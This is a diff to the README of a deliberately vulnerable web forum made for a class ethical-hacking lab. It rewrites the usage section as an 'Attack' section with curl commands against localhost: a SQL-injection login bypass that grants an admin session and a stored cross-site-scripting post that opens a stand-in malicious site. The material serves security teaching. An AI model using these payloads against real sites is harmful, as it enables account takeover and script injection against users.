@@ -1,48 +1,21 @@
 # Vulnerable Forum
 This is a vulnerable web forum to act as dummy application to be the punching bag for whilst doing my ethical hacking lab for class.
 
-## Installation
+## Attack
 
-    $ gem install vulnerable_forum
-
-## Usage
-
-
-#### SQL Injection 
-SQL Inject the login form however you'd like, even at the command-line!:
-
+Get an admin session via SQL injection. 
 ```shell
-> curl localhost:4567 --cookie "cookies.txt" --cookie-jar "cookies.txt"
-Welcome to the forum!
-Total Users: 1
-Total Posts: 2
-
-> curl -X POST localhost:4567/login \ 
-    -d "username=' or ''='&password=' or ''='" \ 
-    --cookie "cookies.txt" \ 
-    --cookie-jar "cookies.txt"
-Welcome back John!
-
-> curl localhost:4567 --cookie "cookies.txt" --cookie-jar "cookies.txt"
-Welcome to the forum, John!
-Total Users: 1
-Total Posts: 2
+curl -X POST localhost:4567/login -d "username=' or ''='&password=' or ''='" --cookie "cookies.txt" --cookie-jar "cookies.txt"
 ```
 
-#### Stored Cross-Site Scripting
-Stored XXS attacks are fun, huh?:
-
+Store some malicious JS.
 ```shell
-> curl -X POST localhost:4567/posts \ 
-  -d "title=Hacked&content=<script>alert('Hacked!')</script>" \
-  --cookie "cookies.txt" \
-  --cookie-jar "cookies.txt"
-
-> curl -X POST localhost:4567/posts \ 
-  -d "title=Hacked&content=<script>window.open('maliciouswebsite.com');</script>" \
-  --cookie "cookies.txt" \
-  --cookie-jar "cookies.txt"
+curl -X POST localhost:4567/posts -d "title=Hacked&content=<script>window.open('maliciouswebsite.com');</script>" --cookie "cookies.txt" --cookie-jar "cookies.txt"
 ```
+
+???
+
+Profit.
 
 ## License
 
